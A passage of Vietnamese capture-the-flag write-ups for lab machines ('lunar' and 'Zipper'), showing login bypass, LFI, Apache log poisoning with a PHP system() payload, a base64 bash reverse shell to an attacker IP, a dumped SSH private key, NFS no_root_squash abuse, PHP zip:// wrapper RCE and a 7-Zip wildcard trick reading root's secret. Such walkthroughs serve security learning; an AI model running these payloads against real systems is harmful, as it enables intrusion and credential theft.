Như vậy thì ta chỉ cần F12, đổi `name="password"` thành `name="password[]"` và nhập email đã lấy ở trên, điền bừa giá trị vào password là login được:

![](https://i.imgur.com/kwEPKsg.png)

Login thành công, ta được đưa về trang `/dashboard`:

![](https://i.imgur.com/x0VFfMS.png)

Quay lại với `dashboard.php` lấy được trong `backup.zip`, ta thấy phần code xử lý của dashboard:

```php 
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['show'])) {
        if(containsStr($_GET['show'], 'pending') || containsStr($_GET['show'], 'completed')) {
            error_reporting(E_ALL ^ E_WARNING); 
            include $_GET['show'] . $ext;
        } else {
            echo 'You can select either one of these only';
        }
    }
?>
```

Ta thấy ở đây có LFI khi mà sử dụng `include $_GET['show'] . $ext;`.

Thử đọc file `/etc/passwd` để kiểm chứng:

```console 
$ curl -X GET 'http://192.168.62.216/dashboard.php?show=pending../../../../../../../etc/passwd&ext=' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H 'Cookie: PHPSESSID=5nri5anhvo8a4k05vr2mbi48ci'

...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
liam:x:1000:1000::/home/liam:/bin/sh
_rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:114:65534::/var/lib/nfs:/usr/sbin/nologin
...
```

Theo kết quả của `nmap`, ta biết là server engine đang sử dụng là Apache, ta có thể log-poisioning với file `access.log`, trước hết phải xem format của file `access.log`:

```
$ curl -X GET 'http://192.168.62.216/dashboard.php?show=pending../../../../../../../var/log/apache2/access.log&ext=' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H 'Cookie: PHPSESSID=5nri5anhvo8a4k05vr2mbi48ci'

...
192.168.49.62 - - [29/Sep/2022:03:51:41 +0000] "GET / HTTP/1.1" 200 3356 "-" "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.49.62 - - [29/Sep/2022:03:51:41 +0000] "GET /css/bootstrap.css HTTP/1.1" 200 25775 "http://192.168.62.216/" "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.49.62 - - [29/Sep/2022:03:51:41 +0000] "GET /css/responsive.css HTTP/1.1" 200 697 "http://192.168.62.216/" "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0"
...
```

Ta để ý, trong format trên, ta có thể thay đổi `User-Agent`:

```console 
curl -X GET 'http://192.168.62.216/dashboard.php?show=pending../../../../../../../var/log/apache2/access.log&ext=' \
-H 'User-Agent: <?php phpinfo(); ?>' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H 'Cookie: PHPSESSID=5nri5anhvo8a4k05vr2mbi48ci'
```

Bây giờ, truy cập vào `http://192.168.62.216/dashboard.php?show=pending../../../../../../../var/log/apache2/access.log&ext=` trên web, ta sẽ thấy `phpinfo()`:

![](https://i.imgur.com/Z8nDhvu.png)

Ta thấy có thể RCE:

```console 
$ curl -X GET 'http://192.168.62.216/dashboard.php?show=pending../../../../../../../var/log/apache2/access.log&ext=' \
-H 'User-Agent: <?php system($_GET["cmd"]); ?>' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H 'Cookie: PHPSESSID=5nri5anhvo8a4k05vr2mbi48ci'
```

Tạo payload dưới dạng base64:

```console 
$ echo '/bin/bash -i >& /dev/tcp/192.168.49.62/4444 0>&1' | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDkuNjIvNDQ0NCAwPiYxCg==
```

Như vậy, `cmd=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDkuNjIvNDQ0NCAwPiYxCg== | base64 -d | bash`, đưa vào URL encode sẽ thành: 

```url 
cmd=%65%63%68%6f%20%4c%32%4a%70%62%69%39%69%59%58%4e%6f%49%43%31%70%49%44%34%6d%49%43%39%6b%5a%58%59%76%64%47%4e%77%4c%7a%45%35%4d%69%34%78%4e%6a%67%75%4e%44%6b%75%4e%6a%49%76%4e%44%51%30%4e%43%41%77%50%69%59%78%43%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
```

Tiến hành RCE với 1 tab `nc -lvnp 4444` chờ sẵn:

```console 
$ curl -X GET 'http://192.168.62.216/dashboard.php?show=pending../../../../../../../var/log/apache2/access.log&ext=&cmd=%65%63%68%6f%20%4c%32%4a%70%62%69%39%69%59%58%4e%6f%49%43%31%70%49%44%34%6d%49%43%39%6b%5a%58%59%76%64%47%4e%77%4c%7a%45%35%4d%69%34%78%4e%6a%67%75%4e%44%6b%75%4e%6a%49%76%4e%44%51%30%4e%43%41%77%50%69%59%78%43%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H 'Cookie: PHPSESSID=5nri5anhvo8a4k05vr2mbi48ci'
```

![](https://i.imgur.com/Dixrzma.png)

Như đã thấy, user hiện tại là `www-data`, hầu như không làm được gì.

Như thói quen, tôi sẽ kiểm tra một số thư mục như `/opt`, `/tmp` xem có gì hay ho, và tìm được:

![](https://i.imgur.com/02UE1WH.png)

Có vẻ như đây là `id_rsa` của `liam`:

```ssh 
-----BEGIN OPENSSH PRIVATE KEY-----
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
XMUbx9M/i2At8AAAAKbGlhbUBsdW5hcgE=
-----END OPENSSH PRIVATE KEY-----
```

Sử dụng file này để SSH vào `liam` xem sao?

![](https://i.imgur.com/3y5Cehf.png)

Cuối cùng cũng thoát khỏi sự tù túng của revshells :)))) 

Check quyền của `liam`:

```console 
liam@lunar:~$ id
uid=1000(liam) gid=1000(liam) groups=1000(liam),1001(network)
```

Có group `network`, vậy hãy xem group này có tác động đến file nào trong hệ thống?

```console 
liam@lunar:~$ find / -group network 2>/dev/null
/etc/hosts
```

Nội dung file `/etc/hosts`:

```console 
liam@lunar:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.0.1 lunar
```

Đến đây thì bí rồi, sử dụng `Linpeas` hay `LSE` cũng không có gì hữu dụng cả :-1: 

Sau khi nghiền ngẫm một hồi, tôi nhận ra mình đã quên một thứ, `nfs` tại port `2049`, tại [đây](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe) có một bài viết liên quan đến `nfs`.

Trước tiên, phải kiểm tra `/etc/exports`:

```console 
liam@lunar:~$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/share localhost(rw,sync,no_root_squash)
```

Ta thấy có `no_root_squash` tại `/srv/share`, ta có thể leo root thông qua nó, nhưng trước tiên, phải thiết lập lại `/etc/hosts`:

```console 
liam@lunar:~$ cat >/etc/hosts <<EOL
> 192.168.49.62 localhost
> 127.0.0.1 lunar
> EOL
```

Tuyệt, giờ ta có thể mount `/srv/share` về máy và "leo root":

![](https://i.imgur.com/T0JrcS9.png)

# Proving Ground: Zipper

|Machine|Level|
|-------|-----|
|Linux|Hard|

---
**Table of content**

* [I. Recon](#i-recon)
* [II. Exploit](#ii-exploit)
    * [1. RCE](#1-rce)
    * [2. PrivEsc](#2-privesc)
---

## I. Recon

`Nmap` scan:

```console
# Nmap 7.92 scan initiated Mon Oct 17 10:12:32 2022 as: nmap -sC -sV -p22,80,873 -oN nmap.txt 192.168.205.229
Nmap scan report for 192.168.205.229
Host is up (0.19s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp  open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
|_http-server-header: Apache/2.4.41 (Ubuntu)
873/tcp closed rsync
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 17 10:12:46 2022 -- 1 IP address (1 host up) scanned in 13.40 seconds
```

`Feroxbuster` scan web tại port port 80:

```console 
403        9l       28w      280c http://192.168.205.229/.htpasswd
403        9l       28w      280c http://192.168.205.229/.htaccess
403        9l       28w      280c http://192.168.205.229/.hta
200       76l      225w     3151c http://192.168.205.229/index.php
403        9l       28w      280c http://192.168.205.229/server-status
200        8l       26w      155c http://192.168.205.229/style
301        9l       28w      320c http://192.168.205.229/uploads
403        9l       28w      280c http://192.168.205.229/uploads/.hta
403        9l       28w      280c http://192.168.205.229/uploads/.htaccess
403        9l       28w      280c http://192.168.205.229/uploads/.htpasswd
301        9l       28w      320c http://192.168.205.229/uploads
200        8l       26w      155c http://192.168.205.229/style
403        9l       28w      280c http://192.168.205.229/server-status
301        9l       28w      320c http://192.168.205.229/uploads
200        8l       26w      155c http://192.168.205.229/style
403        9l       28w      280c http://192.168.205.229/server-status
```

## II. Exploit

### 1. RCE

Truy cập vào `/index.php` và truy cập vào Home, ta thấy URL có param `file`:

![](https://i.imgur.com/FlBYWpK.png)

Ta có thể thử đọc nội dung của file index thông qua [PHP Wrapper](https://www.php.net/manual/en/wrappers.php.php):

```console 
$ curl 'http://192.168.205.229/index.php?file=php://filter/convert.base64-encode/resource=index' -s | base64 -d

<?php
$file = $_GET['file'];
if(isset($file))
{
    include("$file".".php");
}
else
{
include("home.php");
}
?>
```

Như vậy, server sẽ append thêm `.php` vào `file` param và sau đó `include` nó.

Tiếp theo, thử chức năng upload file:

![](https://i.imgur.com/4CwNwQZ.png)

Tương tự, hãy cùng xem trong `home.php` có gì?

```php 
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Zipper</title>
  <meta name="viewport" content="width=device-width, initial-scale=1", shrink-to-fit=no"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.2/css/bootstrap.min.css'>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'><link rel="stylesheet" href="./style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

</head>
<body>
<?php include 'upload.php'; ?>
<!-- partial:index.partial.html -->
<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
  <a class="navbar-brand" href="#">
    <i class="fa fa-codepen" aria-hidden="true"></i>
    Zipper
  </a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault" aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarsExampleDefault">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/index.php?file=home">Home <span class="sr-only">(current)</span></a>
      </li>
    </ul>
    <form class="form-inline my-2 my-lg-0">
      <input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
      <button class="btn btn-outline-light my-2 my-sm-0" type="submit">Search</button>
    </form>
  </div>
</nav>

<!-- Main jumbotron for a primary marketing message or call to action -->
<div class="jumbotron">
  <div class="container">
    <h1 class="display-3">Welcome to Zipper!</h1>
    <p class="lead">
      With this online ZIP converter you can compress your files and create a ZIP archive. Reduce file size and save bandwidth with ZIP compression. 
      Your uploaded files are encrypted and no one can access them.
    </p>
    <hr class="my-4">
    <div class="page-container row-12">
    		<h4 class="col-12 text-center mb-5">Create Zip File of Multiple Uploaded Files </h4>
    		<div class="row-8 form-container">
            <?php 
            if(!empty($error)) { 
            ?>
    			<p class="error text-center"><?php echo $error; ?></p>
            <?php 
            }
            ?>
            <?php 
            if(!empty($success)) { 
            ?>
    			<p class="success text-center">
            Files uploaded successfully and compressed into a zip format
            </p>
            <p class="success text-center">
            <a href="uploads/<?php echo $success; ?>" target="__blank">Click here to download the zip file</a>
            </p>
	    	    <?php 
            }
            ?>
		    	<form action="" method="post" enctype="multipart/form-data">
				    <div class="input-group">
						<div class="input-group-prepend">
						    <input type="submit" class="btn btn-primary" value="Upload">
						</div>
						<div class="custom-file">
						    <input type="file" class="custom-file-input" name="img[]" multiple>
						    <label class="custom-file-label" >Choose File</label>
						</div>
					</div>
				</form>
				
    		</div>
		</div>
  </div>


</div>

<div class="container">
  <footer>
    <p>&copy; Zipper 2021</p>
  </footer>
</div> <!-- /.container -->
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.13.0/umd/popper.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.2/js/bootstrap.bundle.min.js'></script>
</body>
</html>
```

Ta thấy dòng 

```php 
<?php include 'upload.php'; ?>
```

Vẫn sử dụng cách trên, ta lấy được nội dung file `upload.php`:

```php 
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
        
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}
```

File này chỉ có chức năng đơn giản là đóng zip các file được upload lên.

Vì đây là PHP, và còn đang hỗ trợ các wrapper, ta có thể sử dụng cách tương tự như cách lấy các file .php ở trên với wrapper `zip://path/to/.zip%23/path/to/outfile`

Trước tiên, upload file revshell đã chuẩn bị sẵn và lấy url của file zip được tạo:

![](https://i.imgur.com/YIYUu5N.png)

Ta thấy file zip được đặt ở `uploads/upload_1666058413.zip`, bây giờ tiến hành RCE:

```console 
$ curl 'http://192.168.205.229/index.php?file=zip://uploads/upload_1666058413.zip%23revshell'
```

![](https://i.imgur.com/gIFrX4k.png)

### 2. PrivEsc

Enum thì ra được một crontab khá khả thi:

```console 
www-data@zipper:/$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/backup.sh
```

Check quyền và nội dung file `/opt/backup.sh`:

```console
www-data@zipper:/$ ls -l /opt/backup.sh
-rwxr-xr-x 1 root root 153 Aug 12  2021 /opt/backup.sh

www-data@zipper:/$ cat /opt/backup.sh
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

Ta thấy cronjob này sẽ tạo 1 file `/opt/backups/backup.zip` từ những gì ta đã upload với password lấy từ `/root/secret` và log file là `/opt/backups/backup.log`

Ta có thể thực hiện "[Wildcard Spare trick](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#7z)" để đọc file `/root/secret`.

Tạo file `@secret.txt`:

```console
www-data@zipper:/$ cd /var/www/html/uploads

www-data@zipper:/var/www/html/uploads$ touch @secret.txt

www-data@zipper:/var/www/html/uploads$ ln -s /root/secret secret.txt
```

Đợi cho cronjob chạy, ta có thể đọc nội dung file `/root/secret` trong file `/opt/backups/backup.log`:

```console 
www-data@zipper:/var/www/html/uploads$ cat /opt/backups/backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7371 16-Core Processor                 (800F12),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 3109

Scanning the drive:
4 files, 2491 bytes (3 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 4


Files read from disk: 4
Archive size: 3109 bytes (4 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
----------------
Scan WARNINGS: 1
```

Nội dung `/root/secret` là `WildCardsGoingWild`

Thử SSH vào root sử dụng `WildCardsGoingWild`:

![](https://i.imgur.com/0XkzmK8.png)

Thành công leo root.
